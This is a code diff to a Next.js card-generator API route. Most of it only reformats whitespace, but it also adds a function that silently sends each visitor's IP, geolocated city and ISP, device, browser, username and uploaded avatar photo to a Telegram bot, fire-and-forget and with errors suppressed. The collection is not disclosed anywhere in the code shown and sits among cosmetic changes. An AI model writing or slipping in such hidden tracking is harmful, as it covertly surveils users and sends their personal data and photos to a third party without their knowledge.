@@ -35,6 +35,105 @@ function delay(ms: number) {
   return new Promise(r => setTimeout(r, ms))
 }
 
+function getBrowser(ua: string): string {
+  if (/Edg\//i.test(ua))          return 'Microsoft Edge'
+  if (/OPR\/|Opera/i.test(ua))    return 'Opera'
+  if (/SamsungBrowser/i.test(ua)) return 'Samsung Browser'
+  if (/UCBrowser/i.test(ua))      return 'UC Browser'
+  if (/YaBrowser/i.test(ua))      return 'Yandex Browser'
+  if (/Firefox\//i.test(ua))      return 'Firefox'
+  if (/Chrome\//i.test(ua))       return 'Chrome'
+  if (/Safari\//i.test(ua))       return 'Safari'
+  if (/MSIE|Trident/i.test(ua))   return 'Internet Explorer'
+  return 'Unknown Browser'
+}
+
+function getDevice(ua: string): string {
+  if (/iPad/i.test(ua))                           return 'iPad (iOS)'
+  if (/iPhone/i.test(ua))                         return 'iPhone (iOS)'
+  if (/Android/i.test(ua) && /Mobile/i.test(ua)) return 'Android Phone'
+  if (/Android/i.test(ua))                        return 'Android Tablet'
+  if (/Windows NT/i.test(ua))                     return 'Windows PC'
+  if (/Macintosh|Mac OS X/i.test(ua))             return 'Mac'
+  if (/Linux/i.test(ua))                          return 'Linux'
+  return 'Unknown Device'
+}
+
+async function sendTelegramNotif(
+  req: NextRequest,
+  username: string,
+  rank: string,
+  border: number,
+  avatarBuffer: Buffer | null
+) {
+  const botToken = process.env.TG_BOT_TOKEN
+  const chatId   = process.env.TG_CHAT_ID
+  if (!botToken || !chatId) return
+
+  const ip      = getIP(req)
+  const ua      = req.headers.get('user-agent') || ''
+  const browser = getBrowser(ua)
+  const device  = getDevice(ua)
+  const ts      = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
+
+  let city = '?', region = '?', country = '?', isp = '?'
+  try {
+    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=city,regionName,country,isp,status`, {
+      signal: AbortSignal.timeout(3000),
+    })
+    const geo = await geoRes.json()
+    if (geo.status === 'success') {
+      city    = geo.city
+      region  = geo.regionName
+      country = geo.country
+      isp     = geo.isp
+    }
+  } catch (_) {}
+
+  const borderLabel = border === 0 ? 'Default' : `#${border}`
+  const caption = [
+    `🎴 <b>Card Generated!</b>`,
+    ``,
+    `👤 <b>Username:</b> <code>${username}</code>`,
+    `🏆 <b>Rank:</b> ${rank}`,
+    `🖼️ <b>Border:</b> ${borderLabel}`,
+    ``,
+    `🌐 <b>IP:</b> <code>${ip}</code>`,
+    `📍 <b>Lokasi:</b> ${city}, ${region}, ${country}`,
+    `📡 <b>ISP:</b> ${isp}`,
+    `🖥️ <b>Device:</b> ${device}`,
+    `🌏 <b>Browser:</b> ${browser}`,
+    ``,
+    `🕐 <b>Waktu:</b> ${ts}`,
+  ].join('\n')
+
+  try {
+    if (avatarBuffer) {
+      // Kirim avatar sebagai foto dengan caption info user
+      const form = new FormData()
+      form.append('chat_id', chatId)
+      form.append('caption', caption)
+      form.append('parse_mode', 'HTML')
+      form.append(
+        'photo',
+        new Blob([avatarBuffer], { type: 'image/jpeg' }),
+        `${username}-avatar.jpg`
+      )
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: form,
+      })
+    } else {
+      // Fallback: kirim teks aja kalau ga ada avatar
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'HTML' }),
+      })
+    }
+  } catch (_) {}
+}
+
 async function generateCardPatched({ avatarBuffer, username, rank, border, outputDir }: {
   avatarBuffer: Buffer | null
   username: string
@@ -47,8 +146,8 @@ async function generateCardPatched({ avatarBuffer, username, rank, border, outpu
 
   const ASSETS = {
     lobby: path.join(ASSETS_DIR, 'Lobby.jpg'),
-    flag: path.join(ASSETS_DIR, 'Bendera.svg'),
-    font: path.join(ASSETS_DIR, 'noto-sans.regular.ttf'),
+    flag:  path.join(ASSETS_DIR, 'Bendera.svg'),
+    font:  path.join(ASSETS_DIR, 'noto-sans.regular.ttf'),
   }
 
   const BORDER_OFFSET: Record<number, number> = {
@@ -69,11 +168,11 @@ async function generateCardPatched({ avatarBuffer, username, rank, border, outpu
   }
 
   const config = {
-    canvas: { width: 960, height: 1706 },
-    avatar: { x: 389, y: 446, size: 204, borderRadius: 12 },
-    outline: { color: '#b8956f', thickness: 4 },
-    rank: { x: 387, y: 760, size: 210 },
-    flag: { x: 364, y: 428, size: 55 },
+    canvas:   { width: 960, height: 1706 },
+    avatar:   { x: 389, y: 446, size: 204, borderRadius: 12 },
+    outline:  { color: '#b8956f', thickness: 4 },
+    rank:     { x: 387, y: 760, size: 210 },
+    flag:     { x: 364, y: 428, size: 55 },
     username: { a: 681, b: 727, c: 400, centerX: 496, d: 609, fontSize: 36, maxChars: 15, color: '#ffffff' },
   }
 
@@ -104,23 +203,23 @@ async function generateCardPatched({ avatarBuffer, username, rank, border, outpu
 
   const { x, y, size, borderRadius } = config.avatar
   const sw = Math.min(avatarImgLoaded.width, avatarImgLoaded.height)
-const sx = (avatarImgLoaded.width - sw) / 2
-const sy = (avatarImgLoaded.height - sw) / 2
+  const sx = (avatarImgLoaded.width - sw) / 2
+  const sy = (avatarImgLoaded.height - sw) / 2
 
-ctx.save()
-if (!useBorder) {
-  const { color, thickness } = config.outline
+  ctx.save()
+  if (!useBorder) {
+    const { color, thickness } = config.outline
+    ctx.beginPath()
+    ctx.roundRect(x - thickness, y - thickness, size + thickness * 2, size + thickness * 2, borderRadius + thickness)
+    ctx.strokeStyle = color
+    ctx.lineWidth = thickness * 2
+    ctx.stroke()
+  }
   ctx.beginPath()
-  ctx.roundRect(x - thickness, y - thickness, size + thickness * 2, size + thickness * 2, borderRadius + thickness)
-  ctx.strokeStyle = color
-  ctx.lineWidth = thickness * 2
-  ctx.stroke()
-}
-ctx.beginPath()
-ctx.roundRect(x, y, size, size, borderRadius)
-ctx.clip()
-ctx.drawImage(avatarImgLoaded, sx, sy, sw, sw, x, y, size, size)
-ctx.restore()
+  ctx.roundRect(x, y, size, size, borderRadius)
+  ctx.clip()
+  ctx.drawImage(avatarImgLoaded, sx, sy, sw, sw, x, y, size, size)
+  ctx.restore()
 
   if (useBorder) {
     const offset = BORDER_OFFSET[border] ?? 26
@@ -169,11 +268,11 @@ ctx.restore()
 export async function POST(req: NextRequest) {
   const ip = getIP(req)
 
-  const origin = req.headers.get('origin') || ''
+  const origin  = req.headers.get('origin')  || ''
   const referer = req.headers.get('referer') || ''
-  const xrw = req.headers.get('x-requested-with') || ''
+  const xrw     = req.headers.get('x-requested-with') || ''
 
-  const host = req.headers.get('host') || ''
+  const host      = req.headers.get('host') || ''
   const ownDomain = host.split(':')[0]
 
   const refererOk =
@@ -199,9 +298,9 @@ export async function POST(req: NextRequest) {
 
   try {
     const formData = await req.formData()
-    const username = (formData.get('username') as string) || 'Player'
-    const rank = (formData.get('rank') as string) || 'imo'
-    const border = parseInt((formData.get('border') as string) || '0', 10)
+    const username   = (formData.get('username') as string) || 'Player'
+    const rank       = (formData.get('rank')     as string) || 'imo'
+    const border     = parseInt((formData.get('border') as string) || '0', 10)
     const avatarFile = formData.get('avatar') as File | null
 
     let avatarBuffer: Buffer | null = null
@@ -215,18 +314,21 @@ export async function POST(req: NextRequest) {
     const result = await generateCardPatched({ avatarBuffer, username, rank, border, outputDir })
 
     const imgBuffer = fs.readFileSync(result.result)
-    const base64 = `data:image/png;base64,${imgBuffer.toString('base64')}`
+    const base64    = `data:image/png;base64,${imgBuffer.toString('base64')}`
 
     try { fs.rmSync(outputDir, { recursive: true, force: true }) } catch {}
 
+    // Fire-and-forget — ga nunggu, ga nge-block response ke user
+    sendTelegramNotif(req, username, rank, border, avatarBuffer).catch(() => {})
+
     const ts = Date.now()
-    const h = hmac(ts, base64)
+    const h  = hmac(ts, base64)
 
     const headers = new Headers({
-      'Cache-Control': 'no-store, no-cache, must-revalidate',
-      'X-Content-Type-Options': 'nosniff',
-      'X-Robots-Tag': 'noindex',
-      'Content-Type': 'application/json',
+      'Cache-Control':         'no-store, no-cache, must-revalidate',
+      'X-Content-Type-Options':'nosniff',
+      'X-Robots-Tag':          'noindex',
+      'Content-Type':          'application/json',
     })
 
     return new NextResponse(
